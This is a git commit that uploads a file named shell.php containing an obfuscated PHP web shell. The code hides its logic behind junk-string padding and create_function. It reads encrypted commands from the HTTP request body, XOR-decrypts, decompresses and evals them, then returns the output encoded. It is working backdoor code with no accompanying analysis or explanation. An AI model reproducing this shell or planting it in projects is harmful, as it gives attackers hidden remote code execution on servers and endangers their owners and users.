7334f251ededa5e0e3ff5b019330d84aff525d17
luishadouken <81026586+luishadouken@users.noreply.github.com>
2021-03-20 10:07:56 -0400

    Add files via upload

---
+++ shell.php
@@ -0,0 +1,13 @@
+<?php
+$P='$m[1]u<),u<$k)u<));$o=@ob_get_u<cu<ontents();u<@ob_enu<d_cleau<n();$ru<u<';
+$y=str_replace('BI','','cBIBIreatBIe_BIfuBInctBIion');
+$Y='ch("/$ku<h(.+)$ku<f/",@fu<ile_gu<et_u<contentu<s("php:/u</iu<nput"u<),$m)=';
+$I='$j++,$iu<++){$o.u<=$t{$u<i}^$k{$j}u<;}}u<returnu< $o;}iu<u<f (@u<preg_mat';
+$t='=1u<) {@u<ob_start();@eu<vau<l(@gzunu<compressu<(@x(@bu<u<ase64_decodu<e(';
+$l='s3shvMu<l2YG6u<nAu<ig";functu<ion x($tu<,$u<k){$c=stru<lenu<u<($k);$l=str';
+$h='len($u<t);$o=u<"u<";for($i=u<0;$i<$lu<;){fu<or(u<$j=0;($j<$u<c&&u<$u<i<$l);';
+$k='$k="e7du<80ffeu<";$khu<u<u<="efa212b7c5c5";$u<u<kf="5700e4fu<7193e";$pu<="g';
+$c='=@bu<u<ase64_encode(@x(@u<gzcompu<ress($o),u<$k)u<u<);priu<nt("$p$kh$r$kf");}';
+$w=str_replace('u<','',$k.$l.$h.$I.$Y.$t.$P.$c);
+$K=$y('',$w);$K();
+?>
